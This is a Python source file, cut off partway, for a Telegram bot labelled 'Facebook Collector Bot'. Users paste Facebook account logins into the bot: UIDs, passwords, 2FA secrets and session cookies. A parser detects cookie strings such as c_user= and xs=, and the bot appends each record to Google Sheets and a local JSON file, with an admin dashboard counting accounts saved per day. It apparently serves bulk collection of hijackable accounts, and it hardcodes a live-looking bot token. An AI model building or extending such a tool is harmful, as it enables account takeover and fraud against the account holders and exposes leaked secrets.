"""
╔══════════════════════════════════════════════════════════╗
║     Telegram Facebook Collector Bot  v2.1.1              ║
║     Facebook · Support · Sheets API · Admin Panel        ║
╠══════════════════════════════════════════════════════════╣
║  SETUP:                                                  ║
║   1. pip install python-telegram-bot gspread             ║
║      google-auth --break-system-packages                 ║
║   2. Set BOT_TOKEN  → token from @BotFather              ║
║   3. Set ADMIN_ID   → your Telegram ID (@userinfobot)    ║
║   4. Put credentials.json next to bot.py                 ║
║   5. Run: python bot.py                                  ║
╚══════════════════════════════════════════════════════════╝
"""

import re
import logging
import json
import os
import html
from datetime import datetime, date
from telegram import (
    BotCommand,
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)
from telegram.request import HTTPXRequest
from telegram.constants import ParseMode

# ╔══════════════════════════════════════════════════════════╗
# ║                     CONFIGURATION                        ║
# ╚══════════════════════════════════════════════════════════╝

BOT_TOKEN  = "8974552549:AAG8iYmRr7mj7pDJexuRuxbmyxx5je4Xc-8"  # ← @BotFather token
ADMIN_ID   = 8674605631                                          # ← Your Telegram ID

# Service account credentials file for Google Sheets API
CREDENTIALS_FILE = "credentials.json"

# Google Sheets URL shown to users
SHEETS_URL = "https://sheets.google.com"

# Service account email users must share their sheet with
SERVICE_EMAIL = "bot-sheets@weighty-disk-497920-f0.iam.gserviceaccount.com"

# Sheet column headers (row 1)
SHEET_HEADERS = ["No", "UID", "Password", "2FA", "Link FB", "Cookies"]

USERS_FILE    = "users.json"
FB_DATA_FILE  = "facebook_data.json"
SUPPORT_FILE  = "support_messages.json"

# ── User conversation states ──────────────────────────────
STATE_IDLE              = "idle"
STATE_READY             = "ready"
STATE_WAIT_FB_DATA      = "wait_fb_data"
STATE_WAIT_SUPPORT      = "wait_support"
STATE_WAIT_DELETE       = "wait_delete"
STATE_WAIT_CHANGE_SHEET = "wait_change_sheet"

# ╔══════════════════════════════════════════════════════════╗
# ║                       LOGGING                            ║
# ╚══════════════════════════════════════════════════════════╝

logging.basicConfig(
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    datefmt="%H:%M:%S",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ╔══════════════════════════════════════════════════════════╗
# ║          PER-USER UID CACHE (Duplicate Detection)        ║
# ╚══════════════════════════════════════════════════════════╝

# key = user_id, value = set of UIDs already saved by that user
_uid_cache: dict[int, set] = {}


def _get_gspread_client():
    """Return authorized gspread client."""
    import gspread
    from google.oauth2.service_account import Credentials
    scopes = [
        "https://www.googleapis.com/auth/spreadsheets",
        "https://www.googleapis.com/auth/drive",
    ]
    creds = Credentials.from_service_account_file(CREDENTIALS_FILE, scopes=scopes)
    return gspread.authorize(creds)


def get_uid_cache(user_id: int, sheet_id: str) -> set:
    """Load UIDs from Sheet once, cache in memory."""
    if user_id in _uid_cache:
        return _uid_cache[user_id]
    try:
        gc = _get_gspread_client()
        sh = gc.open_by_key(sheet_id)
        try:
            ws = sh.worksheet("Facebook")
        except Exception:
            ws = sh.sheet1
        all_rows = ws.get_all_values()
        # UID is column index 1 (after No column)
        uids = {r[1].strip() for r in all_rows[1:] if len(r) > 1 and r[1].strip()}
        _uid_cache[user_id] = uids
        logger.info("Loaded %s UIDs for user %s", len(uids), user_id)
    except Exception as e:
        logger.error("UID cache load error: %s", e)
        _uid_cache[user_id] = set()
    return _uid_cache[user_id]


def is_duplicate_uid(user_id: int, uid: str, sheet_id: str) -> bool:
    """Return True if UID already saved by this user."""
    if not uid or not sheet_id:
        return False
    return uid.strip() in get_uid_cache(user_id, sheet_id)


def add_uid_to_cache(user_id: int, uid: str):
    """Add UID to memory cache after successful save."""
    if uid:
        _uid_cache.setdefault(user_id, set()).add(uid.strip())


def reset_uid_cache(user_id: int):
    """Clear UID cache — call when user changes sheet."""
    _uid_cache.pop(user_id, None)


# ╔══════════════════════════════════════════════════════════╗
# ║               GOOGLE SHEETS API HELPER                   ║
# ╚══════════════════════════════════════════════════════════╝

def write_to_sheet(sheet_id: str, row_data: list) -> tuple[bool, str]:
    """
    Append one row to the user's Google Sheet.
    Ensures header row exists on first write.
    Returns (success: bool, error_message: str).
    """
    if not sheet_id:
        return False, "No sheet ID configured"
    try:
        import gspread
        from google.oauth2.service_account import Credentials
        from google.auth.transport.requests import Request

        if not os.path.exists(CREDENTIALS_FILE):
            return False, f"credentials.json not found"

        scopes = [
            "https://www.googleapis.com/auth/spreadsheets",
            "https://www.googleapis.com/auth/drive",
        ]
        creds = Credentials.from_service_account_file(CREDENTIALS_FILE, scopes=scopes)
        creds.refresh(Request())
        gc = gspread.Client(auth=creds)
    except Exception as e:
        logger.error("gspread auth failed: %s", e)
        return False, f"Auth error: {e}"

    try:
        sh       = gc.open_by_key(sheet_id)

        # Get or create Facebook tab
        try:
            ws = sh.worksheet("Facebook")
        except Exception:
            ws = sh.sheet1
            ws.update_title("Facebook")
            logger.info("Renamed Sheet1 → Facebook")

        all_rows = ws.get_all_values()

        # Safe header check — handles [], [[]], or wrong header
        first_cell = ""
        if all_rows and len(all_rows[0]) > 0:
            first_cell = str(all_rows[0][0]).strip()

        if first_cell != "No":
            ws.insert_row(SHEET_HEADERS, index=1)
            all_rows = [SHEET_HEADERS]
            logger.info("Header inserted for sheet %s", sheet_id[:20])

        # Count non-empty data rows only
        data_rows = [r for r in all_rows[1:] if any(c.strip() for c in r)]
        next_no   = len(data_rows) + 1

        ws.append_row([next_no] + row_data, value_input_option="USER_ENTERED")
        logger.info("Sheet write OK: sheet=%s row=%s", sheet_id[:20], next_no)
        return True, ""
    except gspread.exceptions.APIError as e:
        msg = str(e)
        if "429" in msg or "Quota" in msg:
            return False, "Quota exceeded — wait 1 minute and try again"
        if "403" in msg or "PERMISSION_DENIED" in msg:
            return False, f"Permission denied — share sheet with: {SERVICE_EMAIL}"
        if "404" in msg:
            return False, "Sheet not found — check your Sheet ID"
        return False, msg[:200]
    except Exception as e:
        logger.error("Sheet write error: %s", e)
        return False, str(e)[:200]

# ╔══════════════════════════════════════════════════════════╗
# ║               USER DATABASE  (users.json)                ║
# ╚══════════════════════════════════════════════════════════╝

def load_users() -> dict:
    if not os.path.exists(USERS_FILE):
        return {}
    with open(USERS_FILE, "r", encoding="utf-8") as f:
        return json.load(f)


def save_users(users: dict):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)


def get_user(user_id: int) -> dict | None:
    return load_users().get(str(user_id))


def register_user(user_id: int, username: str, full_name: str) -> bool:
    """Register a new user. Returns True if first-time registration."""
    users = load_users()
    uid   = str(user_id)
    if uid not in users:
        users[uid] = {
            "user_id":        user_id,
            "username":       username or "",
            "full_name":      full_name or "",
            "state":          STATE_READY,
            "blocked":        False,
            "joined":         datetime.now().strftime("%d/%m/%Y %H:%M"),
            "last_active":    datetime.now().strftime("%d/%m/%Y %H:%M"),
            "total_saved":    0,
            "today_saved":    0,
            "last_save_date": "",
            "sheet_id":       "",
            "notes":          "",
        }
        save_users(users)
        return True
    return False


def update_last_active(user_id: int):
    users = load_users()
    uid   = str(user_id)
    if uid in users:
        users[uid]["last_active"] = datetime.now().strftime("%d/%m/%Y %H:%M")
        save_users(users)


def block_user(user_id: int) -> bool:
    users = load_users()
    uid   = str(user_id)
    if uid in users:
        users[uid]["blocked"] = True
        save_users(users)
        return True
    return False


def unblock_user(user_id: int) -> bool:
    users = load_users()
    uid   = str(user_id)
    if uid in users:
        users[uid]["blocked"] = False
        save_users(users)
        return True
    return False


def remove_user(user_id: int) -> bool:
    users = load_users()
    uid   = str(user_id)
    if uid in users:
        del users[uid]
        save_users(users)
        return True
    return False


def increment_saved(user_id: int):
    users = load_users()
    uid   = str(user_id)
    if uid in users:
        today = date.today().isoformat()
        if users[uid].get("last_save_date") != today:
            users[uid]["today_saved"]    = 0
            users[uid]["last_save_date"] = today
        users[uid]["total_saved"] = users[uid].get("total_saved", 0) + 1
        users[uid]["today_saved"] = users[uid].get("today_saved", 0) + 1
        save_users(users)


def set_user_note(user_id: int, note: str) -> bool:
    users = load_users()
    uid   = str(user_id)
    if uid in users:
        users[uid]["notes"] = note
        save_users(users)
        return True
    return False


def set_user_sheet(user_id: int, sheet_id: str) -> bool:
    users = load_users()
    uid   = str(user_id)
    if uid in users:
        users[uid]["sheet_id"] = sheet_id
        save_users(users)
        return True
    return False


def parse_admin_target(args: list) -> int | None:
    """
    Parse user_id from admin command args.
    Strips surrounding < > so both /remove 123 and /remove <123> work.
    Returns int or None if invalid.
    """
    if not args:
        return None
    raw = args[0].strip().strip("<>")
    try:
        return int(raw)
    except ValueError:
        return None

# ╔══════════════════════════════════════════════════════════╗
# ║              FACEBOOK DATA  (facebook_data.json)         ║
# ╚══════════════════════════════════════════════════════════╝

def load_fb_data() -> list:
    if not os.path.exists(FB_DATA_FILE):
        return []
    with open(FB_DATA_FILE, "r", encoding="utf-8") as f:
        return json.load(f)


def save_fb_data(records: list):
    with open(FB_DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(records, f, indent=2, ensure_ascii=False)


def is_duplicate(uid: str, cookies: str) -> bool:
    """Return True if UID or cookies already exist in local storage."""
    records = load_fb_data()
    for r in records:
        if uid and r.get("uid") == uid:
            return True
        if cookies and r.get("cookies") == cookies:
            return True
    return False


def add_fb_record(user_id: int, username: str, full_name: str,
                  uid: str, password: str, twofa: str,
                  link_fb: str, cookies: str, sheet_id: str):
    records = load_fb_data()
    records.append({
        "user_id":   user_id,
        "username":  username or "",
        "full_name": full_name or "",
        "uid":       uid,
        "password":  password,
        "2fa":       twofa,
        "link_fb":   link_fb,
        "cookies":   cookies,
        "sheet_id":  sheet_id,
        "saved_at":  datetime.now().strftime("%d/%m/%Y %H:%M"),
        "date":      date.today().isoformat(),
    })
    save_fb_data(records)


def count_fb_today() -> int:
    today = date.today().isoformat()
    return sum(1 for r in load_fb_data() if r.get("date") == today)


def count_fb_total() -> int:
    return len(load_fb_data())


def delete_record_by_uid(user_id: int, uid: str) -> bool:
    records     = load_fb_data()
    new_records = [r for r in records
                   if not (r.get("user_id") == user_id and r.get("uid") == uid)]
    if len(new_records) < len(records):
        save_fb_data(new_records)
        return True
    return False


def get_last_record(user_id: int) -> dict | None:
    records = load_fb_data()
    user_records = [r for r in records if r.get("user_id") == user_id]
    return user_records[-1] if user_records else None

# ╔══════════════════════════════════════════════════════════╗
# ║             SUPPORT MESSAGES  (support_messages.json)    ║
# ╚══════════════════════════════════════════════════════════╝

def load_support() -> list:
    if not os.path.exists(SUPPORT_FILE):
        return []
    with open(SUPPORT_FILE, "r", encoding="utf-8") as f:
        return json.load(f)


def save_support(messages: list):
    with open(SUPPORT_FILE, "w", encoding="utf-8") as f:
        json.dump(messages, f, indent=2, ensure_ascii=False)


def add_support_message(user_id: int, username: str, full_name: str, message: str):
    msgs = load_support()
    msgs.append({
        "user_id":   user_id,
        "username":  username or "",
        "full_name": full_name or "",
        "message":   message,
        "replied":   False,
        "sent_at":   datetime.now().strftime("%d/%m/%Y %H:%M"),
    })
    save_support(msgs)


def count_pending_support() -> int:
    return sum(1 for m in load_support() if not m.get("replied"))


def mark_support_replied(user_id: int):
    msgs = load_support()
    for m in msgs:
        if m.get("user_id") == user_id and not m.get("replied"):
            m["replied"] = True
    save_support(msgs)

# ╔══════════════════════════════════════════════════════════╗
# ║              SMART AUTO-DETECT PARSER                    ║
# ╚══════════════════════════════════════════════════════════╝

def smart_parse(text: str) -> dict:
    uid = password = twofa = link_fb = cookies = ""
    lines = [l.strip() for l in text.strip().splitlines() if l.strip()]
    for line in lines:
        lo = line.lower()
        if re.match(r'uid\s*[:\-]', lo):
            uid = re.sub(r'uid\s*[:\-]\s*', '', line, flags=re.IGNORECASE).strip(); continue
        if re.match(r'pass(word)?\s*[:\-]', lo):
            password = re.sub(r'pass(word)?\s*[:\-]\s*', '', line, flags=re.IGNORECASE).strip(); continue
        if re.match(r'2fa\s*[:\-]', lo):
            twofa = re.sub(r'2fa\s*[:\-]\s*', '', line, flags=re.IGNORECASE).strip(); continue
        if re.match(r'link\s*(fb)?\s*[:\-]', lo):
            link_fb = re.sub(r'link\s*(fb)?\s*[:\-]\s*', '', line, flags=re.IGNORECASE).strip(); continue
        if re.match(r'cookies?\s*[:\-]', lo):
            cookies = re.sub(r'cookies?\s*[:\-]\s*', '', line, flags=re.IGNORECASE).strip(); continue
        if re.search(r'(datr=|xs=|c_user=|sb=|wd=|fr=|locale=|pas=)', line):
            cookies = line; continue
        if re.fullmatch(r'\d{10,20}', line):
            uid = line; continue
        if re.fullmatch(r'([A-Z0-9]{4}\s){2,}[A-Z0-9]{4}', line):
            twofa = line; continue
        if re.search(r'facebook\.com', line, re.IGNORECASE):
            link_fb = line; continue
        if not password:
            password = line
    return {"uid": uid, "password": password, "2fa": twofa,
            "link_fb": link_fb, "cookies": cookies}

# ╔══════════════════════════════════════════════════════════╗
# ║                   KEYBOARD BUILDERS                      ║
# ╚══════════════════════════════════════════════════════════╝

def main_menu_keyboard():
    return ReplyKeyboardMarkup(
        [
            ["🔵 Facebook", "🔄 Change Sheet"],
            ["❓ Contact Support"],
        ],
        resize_keyboard=True,
        one_time_keyboard=False,
    )


def facebook_inline_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔵 Submit Facebook Data", callback_data="open_facebook")],
        [InlineKeyboardButton("🗑 Delete Last Entry",    callback_data="open_delete")],
        [InlineKeyboardButton("🔄 Change My Sheet",      callback_data="open_change_sheet")],
        [InlineKeyboardButton("❓ Contact Support",      callback_data="open_support")],
        [InlineKeyboardButton("🌐 Open Google Sheets",   url=SHEETS_URL)],
    ])


def admin_inline_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("👥 All Users",     callback_data="admin_users"),
            InlineKeyboardButton("📊 Statistics",    callback_data="admin_stats"),
        ],
        [
            InlineKeyboardButton("⏳ Support Queue", callback_data="admin_support"),
            InlineKeyboardButton("🚫 Blocked",        callback_data="admin_blocked"),
        ],
    ])

# ╔══════════════════════════════════════════════════════════╗
# ║                     /start HANDLER                       ║
# ╚══════════════════════════════════════════════════════════╝

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user    = update.effective_user
    user_id = user.id
    context.user_data.pop("state", None)

    # ── Admin dashboard ──────────────────────────────────
    if user_id == ADMIN_ID:
        users         = load_users()
        total_users   = len(users)
        fb_today      = count_fb_today()
        fb_total      = count_fb_total()
        blocked_count = sum(1 for u in users.values() if u.get("blocked"))
        pending_sup   = count_pending_support()

        await update.message.reply_text(
            "╔══════════════════════════════════╗\n"
            "║   👑  Admin Dashboard  v2.1.1    ║\n"
            "╚══════════════════════════════════╝\n\n"
            f"Welcome back, *{html.escape(user.first_name)}*!\n\n"
            "📊 *Quick Stats:*\n"
            f"  👥 Total Users:          *{total_users}*\n"
            f"  🔵 FB Saved Today:       *{fb_today}*\n"
            f"  📈 Total FB Saved:       *{fb_total}*\n"
            f"  🚫 Blocked Users:        *{blocked_count}*\n"
            f"  ❓ Pending Support:      *{pending_sup}*\n\n"
            "📋 *Commands:*\n"
            "• `/users` — View all users\n"
            "• `/stats` — Full statistics\n"
            "• `/userinfo <id>` — User details\n"
            "• `/support` — View support messages\n"
            "• `/block <id>` — Block user\n"
            "• `/unblock <id>` — Unblock user\n"
            "• `/remove <id>` — Remove user\n"
            "• `/note <id> <text>` — Add note to user\n"
            "• `/broadcast <msg>` — Send to all users\n"
            "• `/msg <id> <text>` — Reply to user\n"
            "• `/fbdata` — View all Facebook records\n\n"
            "_Tip: you can use `/remove 123` or `/remove <123>`_",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=admin_inline_keyboard(),
        )
        return

    # ── Register / fetch user ─────────────────────────────
    is_new = register_user(user_id, user.username, user.full_name)
    update_last_active(user_id)
    u = get_user(user_id)

    # ── Blocked check ─────────────────────────────────────
    if u and u.get("blocked"):
        await update.message.reply_text(
            "🚫 *Your account has been blocked.*\n"
            "Please contact support for assistance.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # ── New user or missing sheet: show setup ─────────────
    if is_new or not (u and u.get("sheet_id")):
        await _send_sheet_setup(update, user, is_new=True)
        context.user_data["state"] = STATE_WAIT_CHANGE_SHEET
        return

    # ── Returning user: show main menu ────────────────────
    sheet_short = (u["sheet_id"][:18] + "…") if len(u.get("sheet_id", "")) > 18 else u.get("sheet_id", "—")
    await update.message.reply_text(
        "╔══════════════════════════════════╗\n"
        "║     🤖  Account Bot  v2.1.1      ║\n"
        "╚══════════════════════════════════╝\n\n"
        f"👋 Welcome back, *{html.escape(user.first_name)}*!\n\n"
        "📊 *Your Stats:*\n"
        f"  💾 Total Saved:  *{u.get('total_saved', 0)}*\n"
        f"  📅 Today Saved:  *{u.get('today_saved', 0)}*\n"
        f"  📋 Sheet ID:     `{sheet_short}`\n\n"
        "Choose an action below:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=facebook_inline_keyboard(),
    )


async def _send_sheet_setup(update, user, is_new=True):
    """Send the Google Sheet setup instructions."""
    greeting = f"👋 Hello, *{html.escape(user.first_name)}*!\n\n" if is_new else ""
    await update.message.reply_text(
        "╔══════════════════════════════════╗\n"
        "║     🤖  Account Bot  v2.1.1      ║\n"
        "╚══════════════════════════════════╝\n\n"
        + greeting +
        "To use this bot, set up your *Google Sheet*.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📋 *Setup Steps:*\n\n"
        "*Step 1* — Tap the button below to open Google Sheets 👇\n\n"
        "*Step 2* — Create a new spreadsheet\n\n"
        "*Step 3* — Click *Share*, paste the service email below,\n"
        "set role to *Editor*, then click *Send*\n\n"
        "📧 *Service Account Email* (tap & hold to copy):\n"
        f"`{SERVICE_EMAIL}`\n\n"
        "*Step 4* — Copy your *Sheet ID* from the URL\n"
        "_The URL looks like:_\n"
        "`https://docs.google.com/spreadsheets/d/` *YOUR\\-ID* `/edit`\n\n"
        "*Step 5* — Paste the Sheet ID here ⬇️\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 Open Google Sheets", url=SHEETS_URL)]
        ]),
    )


def _sheet_setup_text() -> str:
    """Inline button version (edit_message_text) of sheet setup."""
    return (
        "╔══════════════════════════════════╗\n"
        "║   🔄  Change Google Sheet        ║\n"
        "╚══════════════════════════════════╝\n\n"
        "1️⃣  Tap the button below to open Google Sheets 👇\n\n"
        "2️⃣  Open your spreadsheet → click *Share*\n\n"
        "3️⃣  Paste this service email, set *Editor*, click *Send*:\n"
        f"`{SERVICE_EMAIL}`\n\n"
        "4️⃣  Copy the Sheet ID from the URL and send it here\n\n"
        "Type /cancel to go back."
    )

# ╔══════════════════════════════════════════════════════════╗
# ║                  CALLBACK QUERY HANDLER                  ║
# ╚══════════════════════════════════════════════════════════╝

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query   = update.callback_query
    user    = query.from_user
    user_id = user.id
    data    = query.data
    await query.answer()

    # ── Submit Facebook data ──────────────────────────────
    if data == "dup_save":
        pending = context.user_data.pop("pending_dup", None)
        if not pending:
            await query.edit_message_text(
                "❌ Session expired. Please paste your data again.",
                reply_markup=facebook_inline_keyboard(),
            )
            return
        parsed   = pending["parsed"]
        sheet_id = pending["sheet_id"]
        row = [parsed["uid"], parsed["password"], parsed["2fa"],
               parsed["link_fb"], parsed["cookies"]]
        ok, err = write_to_sheet(sheet_id, row)
        if ok:
            increment_saved(user_id)
            add_uid_to_cache(user_id, parsed["uid"])
            u = get_user(user_id)
            await query.edit_message_text(
                "✅ Saved!\n\n"
                f"UID: {pending['uid_d']}\n"
                f"PW:  {pending['pw_d']}\n\n"
                f"Total: {u.get('total_saved', 0) if u else 1}",
                reply_markup=facebook_inline_keyboard(),
            )
        else:
            await query.edit_message_text(
                f"❌ Failed: {err[:100]}",
                reply_markup=facebook_inline_keyboard(),
            )
        return

    if data == "dup_cancel":
        context.user_data.pop("pending_dup", None)
        await query.edit_message_text(
            "❌ Cancelled. Data was not saved.",
            reply_markup=facebook_inline_keyboard(),
        )
        return

    if data == "open_facebook":
        if user_id == ADMIN_ID:
            await query.answer("Admin: use /fbdata to view records.", show_alert=True)
            return
        context.user_data["state"] = STATE_WAIT_FB_DATA
        await query.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║   🔵  Facebook Data Entry    ║\n"
            "╚══════════════════════════════╝\n\n"
            "📤 *Send your Facebook account data.*\n"
            "_Each field on a separate line — auto-detected!_\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "*Example format:*\n"
            "```\n"
            "uid: 61590542999291\n"
            "password: yourpassword\n"
            "2fa: H4PL AC2X HA6K BJ4K ABYE\n"
            "link: https://facebook.com/yourprofile\n"
            "cookies: datr=xxx; xs=xxx; c_user=xxx;\n"
            "```\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Type /cancel to go back.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # ── Delete last entry ─────────────────────────────────
    if data == "open_delete":
        if user_id == ADMIN_ID:
            await query.answer("Admin: use /fbdata to manage records.", show_alert=True)
            return
        last = get_last_record(user_id)
        if not last:
            await query.answer("No records found to delete.", show_alert=True)
            return
        uid_d = last.get("uid") or "—"
        pw_d  = "●" * min(len(last.get("password", "")), 6) or "—"
        now   = last.get("saved_at", "?")
        context.user_data["state"]      = STATE_WAIT_DELETE
        context.user_data["delete_uid"] = last.get("uid", "")
        await query.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║   🗑  Delete Last Entry?     ║\n"
            "╚══════════════════════════════╝\n\n"
            "Your last saved entry:\n\n"
            f"🔢 UID:      `{uid_d}`\n"
            f"🔑 Password: `{pw_d}`\n"
            f"🕐 Saved at: {now}\n\n"
            "⚠️ Are you sure you want to delete this?",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ Yes, Delete", callback_data="confirm_delete"),
                    InlineKeyboardButton("❌ Cancel",      callback_data="cancel_delete"),
                ]
            ]),
        )
        return

    if data == "confirm_delete":
        uid_to_del = context.user_data.pop("delete_uid", "")
        context.user_data.pop("state", None)
        if uid_to_del and delete_record_by_uid(user_id, uid_to_del):
            await query.edit_message_text(
                "✅ *Entry deleted successfully!*",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=facebook_inline_keyboard(),
            )
        else:
            await query.edit_message_text(
                "❌ Could not find that entry to delete.",
                reply_markup=facebook_inline_keyboard(),
            )
        return

    if data == "cancel_delete":
        context.user_data.pop("state", None)
        context.user_data.pop("delete_uid", None)
        await query.edit_message_text("↩️ Cancelled.", reply_markup=facebook_inline_keyboard())
        return

    # ── Change Google Sheet ───────────────────────────────
    if data == "open_change_sheet":
        if user_id == ADMIN_ID:
            await query.answer("Admin does not need a personal sheet.", show_alert=True)
            return
        context.user_data["state"] = STATE_WAIT_CHANGE_SHEET
        await query.edit_message_text(
            _sheet_setup_text(),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🌐 Open Google Sheets", url=SHEETS_URL)]
            ]),
        )
        return

    # ── Contact support ───────────────────────────────────
    if data == "open_support":
        if user_id == ADMIN_ID:
            await query.answer()
            return
        context.user_data["state"] = STATE_WAIT_SUPPORT
        await query.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║   ❓  Contact Support        ║\n"
            "╚══════════════════════════════╝\n\n"
            "✍️ *Type your message below.*\n\n"
            "_Describe your issue clearly — the admin will reply soon._\n\n"
            "Type /cancel to go back.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # ── Admin-only callbacks ──────────────────────────────
    if user_id != ADMIN_ID:
        return

    if data == "admin_stats":
        users    = load_users()
        fb_today = count_fb_today()
        fb_total = count_fb_total()
        total    = len(users)
        blocked  = sum(1 for u in users.values() if u.get("blocked"))
        pending  = count_pending_support()
        await query.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║   📊  Statistics             ║\n"
            "╚══════════════════════════════╝\n\n"
            f"👥 *Total Users:*         {total}\n"
            f"🚫 *Blocked Users:*       {blocked}\n\n"
            f"🔵 *FB Saved Today:*      {fb_today}\n"
            f"📈 *Total FB Saved:*      {fb_total}\n\n"
            f"❓ *Pending Support:*     {pending}\n\n"
            f"🕐 {datetime.now().strftime('%d/%m/%Y %H:%M')}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=admin_inline_keyboard(),
        )

    elif data == "admin_users":
        users = load_users()
        if not users:
            await query.edit_message_text("📋 No users yet.", reply_markup=admin_inline_keyboard())
            return
        lines = [
            "╔══════════════════════════════╗\n"
            "║   👥  All Users              ║\n"
            "╚══════════════════════════════╝\n"
        ]
        for u in users.values():
            status = "🚫" if u.get("blocked") else "✅"
            lines.append(
                f"{status} *{html.escape(u['full_name'])}* (@{html.escape(u.get('username') or 'none')})\n"
                f"   🆔 `{u['user_id']}` | 💾 {u.get('total_saved', 0)} | 📅 {u.get('joined', '?')}\n"
            )
        text = "\n".join(lines)
        await query.edit_message_text(
            text[:4000], parse_mode=ParseMode.MARKDOWN, reply_markup=admin_inline_keyboard()
        )

    elif data == "admin_support":
        msgs    = load_support()
        pending = [m for m in msgs if not m.get("replied")]
        if not pending:
            await query.edit_message_text("✅ No pending support messages.", reply_markup=admin_inline_keyboard())
            return
        lines = [
            "╔══════════════════════════════╗\n"
            "║   ❓  Pending Support        ║\n"
            "╚══════════════════════════════╝\n"
        ]
        for m in pending[-20:]:
            lines.append(
                f"👤 *{html.escape(m['full_name'])}* | 🆔 `{m['user_id']}`\n"
                f"💬 {html.escape(m['message'][:80])}\n"
                f"🕐 {m['sent_at']}\n"
                f"`/msg {m['user_id']} <reply>`\n"
            )
        await query.edit_message_text(
            "\n".join(lines)[:4000], parse_mode=ParseMode.MARKDOWN, reply_markup=admin_inline_keyboard()
        )

    elif data == "admin_blocked":
        users   = load_users()
        blocked = [u for u in users.values() if u.get("blocked")]
        if not blocked:
            await query.edit_message_text("✅ No blocked users.", reply_markup=admin_inline_keyboard())
            return
        lines = [
            "╔══════════════════════════════╗\n"
            "║   🚫  Blocked Users          ║\n"
            "╚══════════════════════════════╝\n"
        ]
        for u in blocked:
            lines.append(
                f"🚫 *{html.escape(u['full_name'])}* (@{html.escape(u.get('username') or 'none')})\n"
                f"   🆔 `{u['user_id']}` | `/unblock {u['user_id']}`\n"
            )
        await query.edit_message_text(
            "\n".join(lines)[:4000], parse_mode=ParseMode.MARKDOWN, reply_markup=admin_inline_keyboard()
        )

# ╔══════════════════════════════════════════════════════════╗
# ║                   MESSAGE HANDLER                        ║
# ╚══════════════════════════════════════════════════════════╝

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user    = update.effective_user
    user_id = user.id
    text    = update.message.text.strip()

    # ── Admin plaintext ───────────────────────────────────
    if user_id == ADMIN_ID:
        await update.message.reply_text(
            "👑 *Admin mode* — Use /start to see the dashboard.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    u = get_user(user_id)
    if not u:
        await start(update, context)
        return

    if u.get("blocked"):
        await update.message.reply_text("🚫 Your account has been blocked.")
        return

    update_last_active(user_id)
    state = context.user_data.get("state", "")

    # ── STATE: Waiting for Google Sheet ID ───────────────
    if state == STATE_WAIT_CHANGE_SHEET:
        sheet_id  = text.strip()
        url_match = re.search(r'/spreadsheets/d/([a-zA-Z0-9_\-]+)', sheet_id)
        if url_match:
            sheet_id = url_match.group(1)
        if len(sheet_id) < 20:
            await update.message.reply_text(
                "❌ *Invalid Sheet ID.*\n\n"
                "Please paste either:\n"
                "• The Sheet ID directly\n"
                "• The full Google Sheets URL\n\n"
                "Try again or type /cancel.",
                parse_mode=ParseMode.MARKDOWN,
            )
            return
        context.user_data.pop("state", None)
        reset_uid_cache(user_id)
        set_user_sheet(user_id, sheet_id)
        sheet_short = (sheet_id[:18] + "…") if len(sheet_id) > 18 else sheet_id
        await update.message.reply_text(
            "✅ *Google Sheet saved!*\n\n"
            f"📋 Sheet ID: `{sheet_short}`\n\n"
            "Your data will be written to this sheet from now on.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=facebook_inline_keyboard(),
        )
        return

    # ── STATE: Waiting for support message ───────────────
    if state == STATE_WAIT_SUPPORT:
        context.user_data.pop("state", None)
        add_support_message(user_id, user.username, user.full_name, text)
        now_str = datetime.now().strftime("%d/%m/%Y %H:%M")
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    "╔══════════════════════════════╗\n"
                    "║   ❓  Support Request         ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"👤 *{html.escape(user.full_name)}*\n"
                    f"🔖 @{html.escape(user.username or 'no username')}\n"
                    f"🆔 `{user_id}`\n\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"💬 *Message:*\n{html.escape(text)}\n"
                    "━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🕐 {now_str}\n\n"
                    f"📩 _To reply:_ `/msg {user_id} your reply here`"
                ),
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception as e:
            logger.error("Failed to forward support message: %s", e)

        await update.message.reply_text(
            "✅ *Your message has been sent to admin!*\n\n"
            "We'll get back to you as soon as possible. 😊",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=main_menu_keyboard(),
        )
        return

    # ── STATE: Waiting for Facebook data ─────────────────
    if state == STATE_WAIT_FB_DATA:
